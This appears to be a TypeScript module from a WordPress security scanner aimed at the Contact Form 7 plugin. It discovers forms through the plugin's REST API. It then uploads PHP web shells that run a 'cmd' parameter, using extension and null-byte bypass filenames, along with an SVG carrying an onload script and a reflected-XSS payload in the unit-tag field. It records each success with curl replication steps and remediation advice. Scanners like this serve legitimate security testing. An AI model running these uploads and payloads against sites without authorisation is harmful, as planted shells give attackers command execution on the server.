import type { ModuleResult, ScanState } from '../types.js';
import { fetchURL, getJSON, finding, moduleResult, normalizeTarget, containsAny, parallelProbe } from '../utils.js';

const MODULE_NAME = 'Contact Form 7';

const CF7_API_BASE    = '/wp-json/contact-form-7/v1/contact-forms';
const BYPASS_FILES: [string, string, string][] = [
  ['shell.php.jpg',    "<?php system($_GET['cmd']); ?>", 'image/jpeg'],
  ['shell.php%00.jpg', "<?php system($_GET['cmd']); ?>", 'image/jpeg'],
  ['shell.php5',       "<?php system($_GET['cmd']); ?>", 'application/octet-stream'],
  ['shell.phtml',      "<?php system($_GET['cmd']); ?>", 'application/octet-stream'],
];
const SVG_XSS = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><circle r="100"/></svg>';
const XSS_UNIT_TAG_PAYLOAD = '"><script>alert(document.domain)</script>';
const XSS_INDICATORS = ['<script>alert', 'alert(document.domain)', 'onload="alert'];

async function discoverForms(target: string): Promise<[string, string][]> {
  const forms: [string, string][] = [];
  try {
    const data = await getJSON<unknown>(`${target}${CF7_API_BASE}`);
    if (data) {
      const items = Array.isArray(data) ? data : (data as Record<string, unknown[]>).items ?? [];
      for (const item of (items as Record<string, unknown>[]).slice(0, 5)) {
        const fid = item['id'];
        if (fid != null) {
          forms.push([String(fid), `${target}${CF7_API_BASE}/${fid}/feedback`]);
        }
      }
    }
  } catch {
    // fall through to defaults
  }
  if (!forms.length) {
    for (const fid of ['1', '2', '3']) {
      forms.push([fid, `${target}${CF7_API_BASE}/${fid}/feedback`]);
    }
  }
  return forms;
}

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: ReturnType<typeof finding>[] = [];
  const errors: string[] = [];

  try {
    const forms = await discoverForms(target);

    // Flatten [form, file] combos for upload bypass tests + SVG + XSS tag — all parallel
    type Combo = ['bypass' | 'svg' | 'xss', string, string, string, string, string];
    const combos: Combo[] = [];
    for (const [formId, feedbackUrl] of forms.slice(0, 3)) {
      for (const [fname, fcontent, ftype] of BYPASS_FILES) {
        combos.push(['bypass', formId, feedbackUrl, fname, fcontent, ftype]);
      }
      combos.push(['svg', formId, feedbackUrl, 'xss.svg', SVG_XSS, 'image/svg+xml']);
      combos.push(['xss', formId, feedbackUrl, '', '', '']);
    }

    await parallelProbe(combos, async ([type, formId, feedbackUrl, fname, fcontent, ftype]) => {
      try {
        if (type === 'bypass' || type === 'svg') {
          const form = new FormData();
          form.append('your-name', 'Tester');
          form.append('your-email', 'test@test.com');
          form.append('your-subject', type === 'svg' ? 'XSS Test' : 'Test');
          form.append('your-message', type === 'svg' ? 'SVG test' : 'Test');
          form.append('your-file', new Blob([fcontent], { type: ftype }), fname);

          const res = await fetchURL(feedbackUrl, { method: 'POST', body: form });
          if (!res || res.status !== 200) return;
          const body = await res.text();
          if (body.includes('mail_sent') || body.toLowerCase().includes('uploaded')) {
            if (type === 'bypass') {
              findings.push(finding('cf7_upload_bypass', 'HIGH', feedbackUrl,
                `Contact Form 7 accepted file with bypass name '${fname}' on form ${formId}. ` +
                'PHP execution may be possible if file lands in web root.',
                {
                  replication_steps: [
                    `curl -s -X POST "${feedbackUrl}" \\`,
                    '  -F "your-name=Tester" -F "your-email=test@test.com" \\',
                    '  -F "your-subject=Test" -F "your-message=Test" \\',
                    `  -F "your-file=@shell.php;filename=${fname};type=${ftype}"`,
                  ],
                  remediation: 'Update CF7. Restrict allowed extensions. Store uploads outside web root.',
                  evidence: JSON.stringify({ filename: fname, mail_sent: body.includes('mail_sent'), cvss_score: 8.1, cve_refs: ['CVE-2020-35489'] }),
                },
              ));
            } else {
              findings.push(finding('cf7_upload_bypass', 'HIGH', feedbackUrl,
                `CF7 form ${formId} accepted SVG file upload. SVG can contain XSS payloads.`,
                {
                  replication_steps: [
                    `curl -s -X POST "${feedbackUrl}" \\`,
                    '  -F "your-name=Tester" -F "your-email=test@test.com" \\',
                    '  -F "your-file=@xss.svg;type=image/svg+xml"',
                  ],
                  remediation: 'Disallow SVG file uploads. Sanitize SVG content if SVG is required.',
                  evidence: JSON.stringify({ detail: 'SVG accepted', cvss_score: 6.1, cve_refs: ['CVE-2020-35489'] }),
                },
              ));
            }
          }
        } else {
          // XSS unit tag test
          const params = new URLSearchParams({
            '_wpcf7_unit_tag': XSS_UNIT_TAG_PAYLOAD,
            'your-name': 'Tester', 'your-email': 'test@test.com',
            'your-subject': 'Test', 'your-message': 'Test',
          });
          const res = await fetchURL(feedbackUrl, {
            method: 'POST', body: params.toString(),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          });
          if (res && res.status === 200) {
            const body = await res.text();
            if (containsAny(body, XSS_INDICATORS)) {
              findings.push(finding('cf7_xss', 'MEDIUM', feedbackUrl,
                `Reflected XSS via _wpcf7_unit_tag field in CF7 form ${formId}.`,
                {
                  replication_steps: [
                    `curl -s -X POST "${feedbackUrl}" \\`,
                    `  -d "_wpcf7_unit_tag=${encodeURIComponent(XSS_UNIT_TAG_PAYLOAD)}" \\`,
                    '  -d "your-name=Tester&your-email=test@test.com&your-subject=Test&your-message=Test"',
                  ],
                  remediation: 'Update Contact Form 7. Validate _wpcf7_unit_tag against known form IDs.',
                  evidence: JSON.stringify({ detail: 'XSS indicator in response', cvss_score: 6.1, cve_refs: ['CVE-2020-35489'] }),
                },
              ));
            }
          }
        }
      } catch (e) {
        errors.push(String(e));
      }
    }, 20);
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
